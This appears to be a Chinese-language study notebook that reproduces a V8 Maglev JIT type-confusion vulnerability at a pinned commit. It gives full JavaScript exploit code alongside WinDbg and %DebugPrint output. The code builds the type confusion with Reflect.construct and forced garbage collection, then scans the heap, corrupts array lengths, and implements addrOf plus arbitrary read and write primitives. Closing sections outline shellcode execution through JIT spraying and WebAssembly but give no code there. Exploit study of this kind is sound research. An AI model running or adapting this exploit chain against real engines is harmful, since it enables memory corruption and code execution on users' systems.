## 1 原js复现

> [!note] 
> 重要的参考：
> https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-maglev/#setting-up-the-v8-debugging-environment 

版本：
```cmd
git checkout 5315f073233429c5f5c2c794594499debda307bd
```

一模一样的操作就可以复现（

![](../images/Pasted%20image%2020250507145219.png)


## 2 理解原理

> [!note] 
> Maglev 编译器中漏洞的根本原因与 V8 中对象构造过程中未完成的对象初始化有关。
> 
> 构造对象时，V8 可能会在设置所有属性之前创建一个部分初始化的对象。
> Maglev 的推测性优化可能会导致对象在这种不完整状态下被使用，从而引发类型混淆。
> 在优化过程中，Maglev 可能会在设置对象属性之前执行使用对象的中间步骤，导致代码访问未初始化的对象。
> 这可能会导致内存损坏漏洞，我们稍后会看到。 


**Maglev** 是 Google V8 JavaScript 引擎中的一种**即时编译器（JIT Compiler）**，于 2022 年提出，用于提升 JavaScript 代码的启动速度和执行效率。
Maglev 是介于 V8 的解释器（Ignition）和优化型编译器（Turbofan）之间的**中层 JIT 编译器**。
使用选项：-maglev



“OOB 访问” 是“**Out Of Bounds 访问**”的缩写，中文叫**越界访问**

## 3 类型混淆

### 3.1 构造类型混淆

> [!note] 
> 通过替换prototype让JIT自动优化成生成Array类（Fast-Path分配/JIT内存重用）
> 利用垃圾回收，引发 header 残留（标记-清除）
> Reflect.construct + 大内存分配 + 回收/重用 = 类型混淆温床


new.target可以检查，来强制使用new。

**`Reflect.construct`** 是 ES6（ECMAScript 2015）引入的一个静态方法，属于 `Reflect` 对象。  
它用于**动态地调用构造函数，相当于用 `new` 创建实例**，但语法更灵活，可以指定 prototype。
普通用法：`const p = Reflect.construct(Person, ["Alice", 30]);`
特殊用法：
![](../images/Pasted%20image%2020250514154026.png)

![](../images/Pasted%20image%2020250514154134.png)

于是用于造成内存破坏：

```javascript

class A {}

var x = Array;

class B extends A {
  constructor() {
    x = new.target; //new.target 代表最初调用链里用的构造函数
    super();
  }
}

function construct() {
  var r = Reflect.construct(B, [], x); //更改new.target=x
  return r;
}

for (let i = 0; i < 2000; i++) {
  construct();
}

let corruptedArr = construct(); 
%DebugPrint(corruptedArr);
//此时已经变成JSArray

var gcSize = 0x4fe00000;
new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);
//触发垃圾回收

corruptedArr = construct(); 
%DebugPrint(corruptedArr);
```

construct()到底造出了什么？
`let corruptedArr = construct();` 
由于 `x = Array`，实际等价于 `Reflect.construct(B, [], Array)`
构造出的对象 `corruptedArr`，它的 prototype 不是 B.prototype，也不是 A.prototype，而是 x.prototype，也就是 Array.prototype


```
DebugPrint: 0000032E0004C3B1: [JS_OBJECT_TYPE]
 - map: 0x032e0019ac79 <Map[52](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x032e0018e4dd <JSArray[0]>
 - elements: 0x032e00000219 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x032e00000219 <FixedArray[0]>
 - All own properties (excluding elements): {}
0000032E0019AC79: [Map] in OldSpace
 - type: JS_OBJECT_TYPE
 - instance size: 52
 - inobject properties: 10
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 10
 - enum length: invalid
 - stable_map
 - back pointer: 0x032e00000251 <undefined>
 - prototype_validity cell: 0x032e00000ab9 <Cell value= 1>
 - instance descriptors (own) #0: 0x032e00000289 <DescriptorArray[0]>
 - prototype: 0x032e0018e4dd <JSArray[0]>
 - constructor: 0x032e0004c201 <JSFunction A (sfi = 0000032E0019A569)>
 - dependent code: 0x032e00000229 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 6
```


但是在迭代2000次后会变成

```
DebugPrint: 000002E3000706B1: [JSArray]
 - map: 0x02e30018e299 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x02e30018e4dd <JSArray[0]>
 - elements: 0x02e300000219 <FixedArray[0]> [PACKED_SMI_ELEMENTS]
 - length: 0
 - properties: 0x02e300000219 <FixedArray[0]>
 - All own properties (excluding elements): {
    000002E300000E0D: [String] in ReadOnlySpace: #length: 0x02e300144a3d <AccessorInfo name= 0x02e300000e0d <String[6]: #length>, data= 0x02e300000251 <undefined>> (const accessor descriptor), location: descriptor
 }
000002E30018E299: [Map] in OldSpace
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_SMI_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x02e300000251 <undefined>
 - prototype_validity cell: 0x02e300000ab9 <Cell value= 1>
 - instance descriptors #1: 0x02e30018ea49 <DescriptorArray[1]>
 - transitions #1: 0x02e30018ea65 <TransitionArray[4]>Transition array #1:
     0x02e300000ed1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_SMI_ELEMENTS) -> 0x02e30018ea7d <Map[16](HOLEY_SMI_ELEMENTS)>

 - prototype: 0x02e30018e4dd <JSArray[0]>
 - constructor: 0x02e30018e205 <JSFunction Array (sfi = 000002E30014B375)>
 - dependent code: 0x02e30006fa65 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

```


引擎JIT优化造成的类型预测和投机性加速（speculative optimization）
第一次调用：
JS引擎“按规范”分配一个普通对象，`Object.create(Array.prototype)`，运行B构造器
没有理由分配“真实数组”，于是出来的是JSObject（只具有原型链的Array行为）

连续大量调用，JIT（如TurboFan）发现：
总是在`Reflect.construct(B, [], Array)`
new.target始终为Array，constructor里什么也没特殊化，也没塞属性，也没自定义this
依然符合`Array`的所有特性
引擎内做了优化：<span style="background:#fff88f">直接创建Array实例</span>，跳过标准 Reflect.construct路径！节约内存、对象复用和加速
因为它推测“你就是想造Array！”

这被称为"**类型特化**"或“**分派/内联缓存的优化折叠**”，是现代JIT的常规手段（V8，SpiderMonkey等都有）。  
触发点通常是数量多（2000次）才激活优化。

此时数组的length还为0，这个时候的分配相当于`new Array()`会初始化
但是触发垃圾回收后length变为有值的

```
DebugPrint: 000002E300042139: [JSArray]
 - map: 0x02e30018e299 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x02e30018e4dd <JSArray[0]>
 - elements: 0x02e300000219 <FixedArray[0]> [PACKED_SMI_ELEMENTS]
 - length: 459150
 - properties: 0x02e300000219 <FixedArray[0]>
 - All own properties (excluding elements): {
    000002E300000E0D: [String] in ReadOnlySpace: #length: 0x02e300144a3d <AccessorInfo name= 0x02e300000e0d <String[6]: #length>, data= 0x02e300000251 <undefined>> (const accessor descriptor), location: descriptor
 }
000002E30018E299: [Map] in OldSpace
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - elements kind: PACKED_SMI_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x02e300000251 <undefined>
 - prototype_validity cell: 0x02e300000ab9 <Cell value= 1>
 - instance descriptors #1: 0x02e30018ea49 <DescriptorArray[1]>
 - transitions #1: 0x02e30018ea65 <TransitionArray[4]>Transition array #1:
     0x02e300000ed1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_SMI_ELEMENTS) -> 0x02e30018ea7d <Map[16](HOLEY_SMI_ELEMENTS)>

 - prototype: 0x02e30018e4dd <JSArray[0]>
 - constructor: 0x02e30018e205 <JSFunction Array (sfi = 000002E30014B375)>
 - dependent code: 0x02e300199e59 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

```


在一些 V8/SpiderMonkey 版本里，大量/大块内存分配常常用以触发垃圾回收、堆整理、free list链表重用，以及碎片内存的分配/释放。
如果前面造出来的对象（尤其是“非典型”对象），在标记-清除/Fast-Path分配/JIT内存重用下被“意外覆盖”了对象数据头部或者 array 元数据slot，那么堆上新分配出来的对象头部内容就可能被污染！


现代 JS 引擎为了极致效率，很多情况下采用快速分配(fast allocate)：
分配速度优先！
只初始化“对象布局图”要求必须初始化的 slot。
如果引擎**假定这一块内存刚才是相同类型的（比如一直在分配Array对象）**，可能会“跳过”对所有 slot 彻底清零。
一些 slot 只有在“后续用到”时才懒初始化。
这意味着：
- **正常用法很难出问题**，因为引擎能高度预测类型并安全复用。
- 一旦你引导引擎分配“和上一对象完全不同的类型”（比如手法复杂的Reflect.construct淆合，或者快速GC后分配大ArrayBuffer释放堆碎片），**对象分配流程就来不及清理所有字段**，从而保留了“上一次”的内容。

在 DebugPrint 下看到数组 length 突然变成 459150，本质是**对象地址重用后 slot/cell 没初始化干净**（UAF——Use After Free范畴）  

### 3.2 利用类型混淆


```js
class A {}

var x = Array;

class B extends A {
  constructor() {
    x = new.target; 
    super();
  }
}

function construct() {
  var r = Reflect.construct(B, [], x);
  return r;
}

let corruptedArr = construct(); 
for (let i = 0; i < 2000; i++) {
    construct(); //多次分配，让JIT形成优化路径
}

var gcSize = 0x4fe00000;
new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);
//垃圾回收

//创建类型混淆的Array
corruptedArr = construct(); 
%DebugPrint(corruptedArr);
console.log("--------------------------------------------");

//corruptedArr elements: 0x014300000219 <FixedArray[0]> [PACKED_SMI_ELEMENTS] 有符号整数
var emptyAddr = 0x219;
function getOffset(addr) {
    return (addr - emptyAddr) / 4 - 2;
}

//corruptedArr[idx] 4字节
function searchDblArrIndex(startAddr, corruptedArr, marker1, marker2, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    for (let idx = startIndex; idx < end; idx += 1) {
        console.log(idx);
      if (corruptedArr[idx] == marker1 && corruptedArr[idx + 2] == marker2) {
        return idx - 3;
      }
    }
}

var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
//第0格：0x41 → 65.0 → 0x4050400000000000 → 40 50 40 00 00 00 00 00
//第1格：0x42 → 66.0 → 0x4050800000000000 → 40 50 80 00 00 00 00 00
//第2格：0x51 → 81.0 → 0x4054400000000000 → 40 54 40 00 00 00 00 00
//第3格：0x52 → 82.0 → 0x4054800000000000 → 40 54 80 00 00 00 00 00
//第4格：1.5 → 1.5 →   0x3ff8000000000000 → 3F F8 00 00 00 00 00 00


//oobDblArr elements: 0x021e00042191 <FixedDoubleArray[5]> [PACKED_DOUBLE_ELEMENTS]
var arrAddr = 0x42191;
//从0x42191找到0x42191+0x1000  idx起始=67548-> 0x219 + 67548 * 4 + 2 = 0x42191
var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, 0x40504000/2, 0x40508000/2, arrAddr + 0x1000);
%DebugPrint(oobDblArr);
console.log("dblIndex=", dblIndex);
%DebugPrint(corruptedArr[dblIndex]);
```



搜索

```
s 0x03c300000219 L?0x42191+1000 40 50 40 00
```

![](../images/Pasted%20image%2020250519151231.png)

![](../images/Pasted%20image%2020250519151443.png)

实际存储应该是
![](../images/Pasted%20image%2020250519151509.png)

另一个：
![](../images/Pasted%20image%2020250519153445.png)


实际上的查找是从0x42191找到0x42191+0x1000 
几乎马上就可以找到

```
                   67547    67548
000003c3`00042188  0019b4e5`0000117d
                   67549    67550
000003c3`00042190  0000000a`00000901
                   67551 = 0x219 + 67551 * 4 + 2 
000003c3`00042198  40504000`00000000
000003c3`000421a0  40508000`00000000

```

不理解为什么要-2



重复corruptedArr = construct();就搜索不到了

s 0x026700000219 L?0x42191+1000 40 50 40 00

![](../images/Pasted%20image%2020250522173915.png)

（可怕md页面出问题了，不知道是不是和内存在被我乱搞有关系）

看起来应该在19d的内存在1fd了
还是要输出一下数组的情况看看
变成421f1了

`elements: 0x0397000421f1 <FixedDoubleArray[5]> [PACKED_DOUBLE_ELEMENTS]`


那为什么原题解可以不变还能通过？我们差什么了？

把放在类型混淆数组和特定数据数组之间的一个参数去掉，发现变少了
也就是说这个中间的东西也会占用这里的内存

`elements: 0x0205000421b1 <FixedDoubleArray[5]> [PACKED_DOUBLE_ELEMENTS]`

可是为什么一次`corruptedArr = construct();`就不受影响

等一下原题解也是受影响的，但是没有我中间的定义0x1000足够找到？
试了一下原题解`corruptedArr = construct()`必须两次，否则会报错

原题解的
`elements: 0x01c9000421e9 <FixedDoubleArray[5]> [PACKED_DOUBLE_ELEMENTS]`

奇怪，不应该找不到啊

从我们代码角度我们的查找应该是
`s 0x026700042191 L0x1000 40 50 40 00`

#### 3.2.1 不能用var？

找到问题了 
var corruptedArr = construct();
这里不能用var或let

![](../images/Pasted%20image%2020250522181739.png)
![](../images/Pasted%20image%2020250522181943.png)


var定义，搜索就会变成
![](../images/Pasted%20image%2020250523103427.png)

那么为什么这里是undefined?

![](../images/Pasted%20image%2020250523104627.png)

看起来很牵强，为什么填充length的指针会影响？我理解是这个指针直接变成值了？
那么我们继续用这个函数，找一个length是这个templateinfo的搜索看看咯

很好，有var的情况，在调用一次就可以了
真的查出来了
![](../images/Pasted%20image%2020250523105253.png)

那么这两种length有什么区别？
gpt解释了，但是还是不太对

![](../images/Pasted%20image%2020250523105710.png)
姑且到这里吧
总结一下，大概是
var引发了内存上的一些变化，于是调用两次`var corruptedArr = construct()`时，恰好length指向的是堆地址，无法被识别为正常的length，于是把整个array是为空。因为元素都是undefined，所以也就搜索不到。

#### 3.2.2 通过corruptedArr修改oobDblArr


输出的地址到底代表什么

我的：42189
搜索出的第一个，数据的前一个8字节的地址，也就是相对于此数据区 elements的地址

![](../images/Pasted%20image%2020250526143512.png)

但是我们定义的固定值数组，搜索出来的应该是第二个

![](../images/Pasted%20image%2020250526144226.png)


![](../images/Pasted%20image%2020250526143457.png)



参考的：421a1
也是搜索出的第一个
![](../images/Pasted%20image%2020250526143906.png)

也是这样
![](../images/Pasted%20image%2020250526144024.png)

也就是到这里找地址找的没问题
但是为什么 在我们定义的数据前面还有一个同样的数组呢？

![](../images/Pasted%20image%2020250526150159.png)

emmm先不管，看看后面的修改
可以在这个似乎是备份的内存里修改成功

![](../images/Pasted%20image%2020250526150120.png)

但是本体没有修改
![](../images/Pasted%20image%2020250526150328.png)

修改了这个备用数据的第一个值后
往下看，重复搜索了一遍，相当于找到固定数组的地址了

然后修改了这个固定数组的长度
![](../images/Pasted%20image%2020250526153611.png)
![](../images/Pasted%20image%2020250526153619.png)

> [!error] 
> 这里对内存的理解有问题
> dps是以指针形式输出，顺序反了！！！！

内存修改如下：

```
00000393`000421d8  00000200[-3]`000421e9[-2]
00000393`000421e0  0020829d[-1]`0000117d[index]
00000393`000421e8  0000000a[+1]`00000901[+2]
00000393`000421f0  00000082[+3]`00000000      <-----原 40 50 40 00 00 00 00 00 后改为 [+3]=0x41
00000393`000421f8  40508000`00000000
```


感觉参考的偏移很奇怪，不理解
![](../images/Pasted%20image%2020250526161223.png)
![](../images/Pasted%20image%2020250526161236.png)


改一下

```
00000393`000421d8  00000200[-6]`000421e9[-5]
00000393`000421e0  0020829d[-4]`0000117d[-3]
00000393`000421e8  0000000a[+2]`00000901[-1]
00000393`000421f0  00000082[index]`00000000      <-----原 40 50 40 00 00 00 00 00 后改为 [+3]=0x41
00000393`000421f8  40508000`00000000
```


于是到这里：

```js
//corruptedArr elements: 0x014300000219 <FixedArray[0]> [PACKED_SMI_ELEMENTS] 有符号整数

var emptyAddr = 0x219;

  

function getOffset(addr) {
    return (addr - emptyAddr) / 4 - 1;
}

function indexToAddr(idx) {
    return (idx + 1) * 4 + emptyAddr;
}

  

var cnt = 0;

function searchDblArrIndex(startAddr, corruptedArr, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    for (let idx = startIndex; idx < end; idx += 1) {
        cnt = cnt + 1;
      if (corruptedArr[idx] == 0x40504000 / 2 && corruptedArr[idx + 2] == 0x40508000 / 2) {
        return idx;
      }
    }
  }

var view = new ArrayBuffer(24);

class A {}
var x = Array;
class B extends A {
  constructor() {
    x = new.target;
    super();
  }
}

function construct() {
  var r = Reflect.construct(B, [], x);
  return r;
}


for (let i = 0; i < 2000; i++) {
    construct(); //多次分配，让JIT形成优化路径
}
 

var gcSize = 0x4fe00000;
new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);
//垃圾回收

//创建类型混淆的Array
var corruptedArr = construct();
corruptedArr = construct();
corruptedArr = construct();
%DebugPrint(corruptedArr);
console.log("--------------------------------------------");

  

var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
//第0格：0x41 → 65.0 → 0x4050400000000000 → 40 50 40 00 00 00 00 00
//第1格：0x42 → 66.0 → 0x4050800000000000 → 40 50 80 00 00 00 00 00
//第2格：0x51 → 81.0 → 0x4054400000000000 → 40 54 40 00 00 00 00 00
//第3格：0x52 → 82.0 → 0x4054800000000000 → 40 54 80 00 00 00 00 00
//第4格：1.5 → 1.5 →   0x3ff8000000000000 → 3F F8 00 00 00 00 00 00
%DebugPrint(oobDblArr);

var oobDblArr2 = [0x41, 0x42, 1.5];
var oobObjArr = [view, 0x424242];
oobObjArr[0] = 0x414141;


//oobDblArr 000003AC000421B9: [JSArray] elements: 0x03ac000421d1 <FixedDoubleArray[5]> [PACKED_DOUBLE_ELEMENTS]
var arrAddr = 0x42191;
var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, arrAddr + 0x1000);
if (dblIndex == null) {
    console.log("cannot find dblIndex");
    exit();
}

  
console.log("dblIndex=", dblIndex, " 0x42191+",cnt);
console.log("oobDblAddr0: " + indexToAddr(dblIndex).toString(16));
corruptedArr[dblIndex] = 1;


var dblAddr = indexToAddr(dblIndex);
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
console.log("oobDblAddr1: " + indexToAddr(dblIndex).toString(16));
console.log("--------------------------------------------");

var oobDblIndex = dblIndex;
corruptedArr[dblIndex] = 0x3FF80000 / 2;
%DebugPrint(oobDblArr);
corruptedArr[dblIndex - 6] = 0x100;
```

参考之后继续搜索
![](../images/Pasted%20image%2020250526162633.png)

![](../images/Pasted%20image%2020250526162653.png)

根据输出，可以知道找到了最后这个匹配
![](../images/Pasted%20image%2020250526143906.png)


#### 3.2.3 oobDblArr和oobObjArr元素存储顺序

继续看参考：
![](../images/Pasted%20image%2020250526171414.png)
继续搜索obj的数组
看起来似乎和arr一样

用4字节输出数组（之前一直那指针形式输出会颠倒内存（
我们希望返回的数据位应该是
![](../images/Pasted%20image%2020250526175351.png)

也就是说我们希望返回的arr的搜索应该是idx-1，返回0值的位


```
0000034a`00042230  00000000 3ff80000 0018eabd 00000219
0000034a`00042240  [-6]00042251 [-5]00000006 [-4]0000117d [-3]00208cb1
0000034a`00042250  [-2]00000901 [-1]00000006 [index]00000000 40504000
0000034a`00042260  00000000 40508000 00000000 3ff80000
```

再搜索一下obj的内存
`s 0x034a00042250 L0x1000 00 82 82 82`

![](../images/Pasted%20image%2020250526180959.png)


于是改成了

```js
function searchDblArrIndex(startAddr, corruptedArr, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    for (let idx = startIndex; idx < end; idx += 1) {
      if (corruptedArr[idx] == 0x40504000 / 2 && corruptedArr[idx + 2] == 0x40508000 / 2) {
        return idx - 1;
      }
    }
}

function getOffset(addr) {
    return (addr - emptyAddr) / 4;
}
function indexToAddr(idx) {
    return (idx) * 4 + emptyAddr;
}
```
这时发现，index修改里面内容没问题，但是计算出来的addr少了8位
于是改成了

```js
function getOffset(addr) {
    return (addr - emptyAddr) / 4 - 2;
}
function indexToAddr(idx) {
    return (idx + 2) * 4 + emptyAddr;
}
```

也就是参考给的函数
这就是为什么要偏移2



另外为了防止每次搜索不到，走到最后报错
可以给Idx一个最后的范围
![](../images/Pasted%20image%2020250526181154.png)

### 3.3 任意地址读写


接下来就可以输出地址了
![](../images/Pasted%20image%2020250526183253.png)

直接在我们的脚本加上去
就可以输出func的地址了
![](../images/Pasted%20image%2020250526184406.png)

现在的js:

```js
class A {}

var x = Array;

class B extends A {
  constructor() {
    x = new.target; 
    super();
  }
}

function construct() {
  var r = Reflect.construct(B, [], x);
  return r;
}

for (let i = 0; i < 2000; i++) {
    construct(); //多次分配，让JIT形成优化路径
}

var gcSize = 0x4fe00000;
new ArrayBuffer(gcSize);
new ArrayBuffer(gcSize);
//垃圾回收

//创建类型混淆的Array
var corruptedArr = construct();
corruptedArr = construct();
corruptedArr = construct();
%DebugPrint(corruptedArr);
console.log("--------------------------------------------");
//corruptedArr elements: 0x014300000219 <FixedArray[0]> [PACKED_SMI_ELEMENTS] 有符号整数
var emptyAddr = 0x219;

function getOffset(addr) {
    return (addr - emptyAddr) / 4 - 2;
}
function indexToAddr(idx) {
    return (idx + 2) * 4 + emptyAddr;
}

//corruptedArr: DebugPrint: 0000023F00042179: [JSArray]
var arrAddr = 0x42179;


//设置固定数组，以便于后续根据数据内容查找数组地址
var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
//第0格：0x41 → 65.0 → 0x4050400000000000 → 00 00 00 00  40 50 40 00 
//第1格：0x42 → 66.0 → 0x4050800000000000 → 00 00 00 00  40 50 80 00
//第2格：0x51 → 81.0 → 0x4054400000000000 → 00 00 00 00  40 54 40 00
//第3格：0x52 → 82.0 → 0x4054800000000000 → 00 00 00 00  40 54 80 00
//第4格：1.5 → 1.5 →   0x3ff8000000000000 → 00 00 00 00  3F F8 00 00
var oobDblArr2 = [0x41, 0x42, 1.5];

var view = new ArrayBuffer(24);
var oobObjArr = [view, 0x424242, 0x434343, 0x434343];
oobObjArr[0] = 0x414141;



function searchDblArrIndex(startAddr, corruptedArr, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    for (let idx = startIndex; idx < end; idx += 1) {
      if (corruptedArr[idx] == 0x40504000 / 2 && corruptedArr[idx + 2] == 0x40508000 / 2) {
        return idx - 1;
      }
    }
}

//-------------------------------------------------------------------------------------------------------
//搜索oobDblArr数据位置
//%DebugPrint(oobDblArr);

var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, arrAddr + 0x1000);
if (dblIndex == null) {
    console.log("cannot find dblIndex");
    exit();
}
//oobDblArr的备份数据
console.log("oobDblAddr0: " + indexToAddr(dblIndex).toString(16));
//corruptedArr[dblIndex] = 1;
var dblAddr = indexToAddr(dblIndex + 4);
//oobDblArr的实际数据
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
console.log("oobDblAddr1 elements: " + indexToAddr(dblIndex-2).toString(16));

dblAddr = indexToAddr(dblIndex + 4);
console.log("--------------------------------------------");

var oobDblIndex = dblIndex;
corruptedArr[dblIndex + 1] = 0x3FF80000 / 2;
%DebugPrint(oobDblArr);
corruptedArr[dblIndex - 5] = 0x100;
console.log("oobDblArr new length: " + oobDblArr.length);

console.log("--------------------------------------------");
//搜索oobDblArr2数据位置
%DebugPrint(oobDblArr2);

//oobDblArr2的备份数据
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
dblAddr = indexToAddr(dblIndex + 4);
//oobDblArr2的实际数据
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
console.log("oobDblAddr2 elements: " + indexToAddr(dblIndex-2).toString(16));
var oobDbl2Index = dblIndex;
//let input2 = readline();

console.log("--------------------------------------------");


function searchObjArrIndex(startAddr, corruptedArr, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    for (let idx = startIndex; idx < end && idx < 67638; idx += 1) {
      if (corruptedArr[idx] == 0x00414141 && corruptedArr[idx + 1] == 0x00424242) {
        return idx;
      }
    }
}

//搜索oobObjArr数据位置
%DebugPrint(oobObjArr);
let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
console.log("oobObjAddr: " + indexToAddr(objIndex-2).toString(16));
//let input2 = readline();




var dblArr = new Float64Array(view);
var intView = new Uint32Array(view);
function ftoi32(f) {
    dblArr[0] = f;
    return [intView[0], intView[1]];
  }
  
  // Convert int array to float
  function i32tof(i1, i2) {
    intView[0] = i1;
    intView[1] = i2;
    return dblArr[0];
  }

function addrOf(obj, dblOffset) {
  oobObjArr[0] = obj;
  var addrDbl = oobDblArr[dblOffset];
  return ftoi32(addrDbl)[0];
}


function func() {
    console.log("test");
}

console.log("--------------------------------------------");
%DebugPrint(func);

var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1);
console.log(funcAddr.toString(16));

```


那么看一下为什么可以输出地址

```js

function addrOf(obj, dblOffset) {
  oobObjArr[0] = obj;
  var addrDbl = oobDblArr[dblOffset];
  return ftoi32(addrDbl)[0];
}

var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1);
```

oobDblIndex：内存数组4字节的第oobDblIndex位，如果按8字节计算oobDblIndex/2
objIndex：内存数组4字节的第objIndex位，8字节就是objIndex/2

oobDblIndex是8字节数组
于是，objIndex的首位相对oobDblIndex就是 `oobDblIndex[objIndex/2-oobDblIndex/2]`


看看从地址读

```js
function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr, 2);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}
//dblArrOffset=(oobDbl2Index - oobDblIndex - 5) >> 1
```

![](../images/Pasted%20image%2020250529161121.png)

可是偏移量为什么要-5呢

根据之前ctf题步骤大概是：
改变elements地址，再输出对应数组的第0位，输出指定地址指向的地址存储的数据

那么oobDbl2Index-5是什么位置呢

对于题解来说：

```
000001e9`000421f0  00000000 00000082 00000000 40508000
000001e9`00042200  00000000 40544000 00000000 40548000
000001e9`00042210  00000000 3ff80000 00000901 00000006
000001e9`00042220  00000000 40504000 00000000 40508000

0000034a`00042230  00000000 3ff80000 [-6]0018eabd [-5]00000219
0000034a`00042240  [-4]00042251 [-3]00000006 [-2]0000117d [-1]00208cb1
0000034a`00042250  [i]00000901 00000006 [my-i]00000000 40504000
0000034a`00042260  00000000 40508000 00000000 3ff80000

000001e9`00042270  00000089 00000004 00000000 00848484
000001e9`00042280  0018eb3d 00000219 00042299 00000004
oobObjAddr:
000001e9`00042290  0000117d 002084f1 00000089 00000004
000001e9`000422a0  0019b819 00848484 00000591 00000003
```

修改时
![](../images/Pasted%20image%2020250530093424.png)


也就是修改的是 `[-4]00042251 [-3]00000006`

好奇怪-4却是11，-5才刚刚好是10（？）
也就是本质上需要的是-6
应该是index从elements开始，使用时的数组是从Index后两位开始，还有2位8字节的头需要减掉
(dbl2-4)-(dbl+2)

之前之所以不用减是因为也对应第一个数据(dbl)-2(obj)+2抵消了
(obj+2)-(dbl+2)

还是理解成偏移量吧
如此说来果然还是直接指向第一个数据更好理解
直接就是：
(obj)-(dbl)
(dbl2-6)-(dbl)


我们要读func的数据段
看一下func的结构
![](../images/Pasted%20image%2020250530104222.png)
也就是我们的目标是func+0x20

之前做ctf时我们知道目标地址需要-0x10才是填入的伪elements地址
于是 成功输出
![](../images/Pasted%20image%2020250530104535.png)

还有一个问题，题解的code还需要返回`oobDblArr2[0][0]`
哦哦这个是
![](../images/Pasted%20image%2020250530112159.png)
转换出来的


我的代码：
```js
function read(addr, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr-0x10, 2);
  var out = ftoi32(oobDblArr2[0]);
  oobDblArr[dblArrOffset] = oldValue;
  return out;
}


var codeAddr = read(funcAddr + 0x20, (oobDbl2Index - oobDblIndex - 6) >> 1);
console.log("code Addr: " + codeAddr[0].toString(16)+" [1]: "+codeAddr[1].toString(16));

function write(addr, val1, val2, dblArrOffset) {
  var oldValue = oobDblArr[dblArrOffset];
  oobDblArr[dblArrOffset] = i32tof(addr-0x10, 2);
  oobDblArr2[0] = i32tof(val1, val2);
  oobDblArr[dblArrOffset] = oldValue;
  return;
}

```


write同理（需要注意和题解不一样，直接填目标地址即可

## 4 绕过沙箱执行shellcode

按照那道CTF题应该搞Wasm的执行面了，但是
![](../images/Pasted%20image%2020250530105748.png)

### 4.1 JIT喷射

原题解中func包括了可用的shellcode组成的float数组
![](../images/Pasted%20image%2020250530105837.png)

![](../images/Pasted%20image%2020250530105908.png)

难道是把函数地址改过去？

看一下code
![](../images/Pasted%20image%2020250530110947.png)


看起来指针是code+0x10处是 
![](../images/Pasted%20image%2020250530112850.png)


### 4.2 使用wasm

![](../images/Pasted%20image%2020250530113241.png)

![](../images/Pasted%20image%2020250530113326.png)



## @PHOEXINA